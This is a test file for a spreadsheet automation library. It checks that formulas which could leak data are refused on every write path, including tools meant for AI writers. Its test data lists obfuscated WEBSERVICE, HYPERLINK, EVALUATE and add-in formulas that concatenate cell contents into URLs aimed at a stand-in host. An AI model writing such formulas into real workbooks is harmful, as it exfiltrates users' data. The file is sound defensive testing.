import { expect, test } from 'vitest';
import { createXlsxFromSheets } from './outline';
import { createXlsxTools, xlsxTools } from './tools/index';
import type { AutomationTool } from './tools/types';
import { createXlsx, readXlsxRange, setXlsxCells } from './xlsx';
import { applyXlsxProposal, proposeXlsxEdits } from './xlsx-proposal';

// Formulas an AI or another automated writer must not place in a workbook, in the forms that
// slipped past a text filter: bare references inside MAP and LET, storage prefixes, AI functions
// an add-in call, text evaluated as a formula and an external workbook reference.
const refused = [
	'=WEBSERVICE("http://127.0.0.1:9/?d="&A1)',
	'=MAP("ht"&"tp://127.0.0.1:9/?d="&A1,WEBSERVICE)',
	'=LET(f,WEBSERVICE,f("ht"&"tp://127.0.0.1:9/"))',
	'=_xlfn._xlws.WEBSERVICE("ht"&"tp://127.0.0.1:9/")',
	'=LET(h,HYPERLINK,h("ht"&"tp://127.0.0.1:9/?"&A1,"Open"))',
	'=COPILOT("summarize",A1:A9)',
	'=_xll.Fetch(A1)',
	'=EVALUATE("WEB"&"SERVICE(A1)")',
	"='C:\\Reports\\[Q1.xlsx]Sheet1'!A1",
];

const byName = (tools: readonly AutomationTool[], name: string) => {
	const found = tools.find((t) => t.name === name);
	if (!found) throw new Error(name);
	return found;
};

async function runEdit(
	tools: readonly AutomationTool[],
	name: string,
	bytes: Uint8Array,
	p: object,
) {
	const tool = byName(tools, name);
	if (tool.kind !== 'edit') throw new Error(name);
	return tool.run(bytes, p);
}

async function propose(tools: readonly AutomationTool[], bytes: Uint8Array, input: string) {
	const tool = byName(tools, 'xlsx_propose_edits');
	if (tool.kind !== 'read') throw new Error('propose');
	return tool.run(bytes, {
		edits: [{ op: 'setCells', sheet: 0, cells: [{ address: 'B1', input }] }],
	}) as Promise<{ proposal: unknown }>;
}

test.each(refused)('%s is refused on every write path', async (input) => {
	const bytes = await createXlsx(['S']);
	const edits = [{ op: 'setCells' as const, sheet: 0, cells: [{ address: 'B1', input }] }];
	const why = /B1: the formula was refused because it/;
	await expect(setXlsxCells(bytes, 0, [{ address: 'B1', input }])).rejects.toThrow(why);
	await expect(proposeXlsxEdits(bytes, edits)).rejects.toThrow(why);
	await expect(createXlsxFromSheets([{ name: 'S', rows: [['secret', input]] }])).rejects.toThrow(
		/S!B1: the formula was refused because it/,
	);
	await expect(
		runEdit(xlsxTools, 'xlsx_set_cells', bytes, {
			sheetIndex: 0,
			cells: [{ address: 'B1', input }],
		}),
	).rejects.toThrow(why);
	await expect(propose(xlsxTools, bytes, input)).rejects.toThrow(why);
	// A proposal made where formulas were allowed is checked again when it is applied.
	const { proposal } = await propose(createXlsxTools({ formulas: 'unrestricted' }), bytes, input);
	await expect(runEdit(xlsxTools, 'xlsx_apply_proposal', bytes, { proposal })).rejects.toThrow(why);
});

test('a defined name cannot hold a restricted formula either', async () => {
	const bytes = await createXlsx(['S']);
	await expect(
		proposeXlsxEdits(bytes, [{ op: 'setName', name: 'Feed', formula: 'MAP(A1,WEBSERVICE)' }]),
	).rejects.toThrow(/name's formula was refused because it uses WEBSERVICE/);
	// A name is where a workbook calls the macro functions, EVALUATE among them.
	await expect(
		proposeXlsxEdits(bytes, [{ op: 'setName', name: 'Calc', formula: 'EVALUATE(S!A1)' }]),
	).rejects.toThrow(/name's formula was refused because it uses EVALUATE/);
});

test('ordinary formulas and look-alike text are written', async () => {
	const bytes = await createXlsxFromSheets([
		{ name: 'S', rows: [[2, '=A1*2', '=IF(A1="http",1,0)', '="a|b"', '+WEBSERVICE(A1)']] },
	]);
	const { cells } = await readXlsxRange(bytes, 0, 'B1:E1');
	expect(cells.map((c) => c.formula ?? c.value)).toEqual([
		'A1*2',
		'IF(A1="http",1,0)',
		'"a|b"',
		'+WEBSERVICE(A1)',
	]);
});

test('a host opts out explicitly, per call or per tool set', async () => {
	const input = '=WEBSERVICE("https://example.test")';
	const bytes = await createXlsx(['S']);
	const set = await setXlsxCells(bytes, 0, [{ address: 'A1', input }], {
		formulas: 'unrestricted',
	});
	expect((await readXlsxRange(set.bytes, 0, 'A1')).cells[0]?.formula).toBe(input.slice(1));
	const created = await createXlsxFromSheets([{ name: 'S', rows: [[input]] }], {
		formulas: 'unrestricted',
	});
	expect((await readXlsxRange(created, 0, 'A1')).cells[0]?.formula).toBe(input.slice(1));
	const open = createXlsxTools({ formulas: 'unrestricted' });
	const { proposal } = await propose(open, bytes, input);
	const applied = await applyXlsxProposal(bytes, proposal as never, { formulas: 'unrestricted' });
	expect((await readXlsxRange(applied.bytes, 0, 'B1')).cells[0]?.formula).toBe(input.slice(1));
	expect(byName(open, 'xlsx_set_cells').description).not.toMatch(/are refused/);
});

test('the tools that write formulas raised their schema version', () => {
	for (const name of ['xlsx_set_cells', 'xlsx_propose_edits', 'xlsx_apply_proposal'])
		expect(byName(xlsxTools, name)).toMatchObject({ version: 2 });
	expect(byName(xlsxTools, 'xlsx_set_cells').description).toMatch(/are refused/);
});
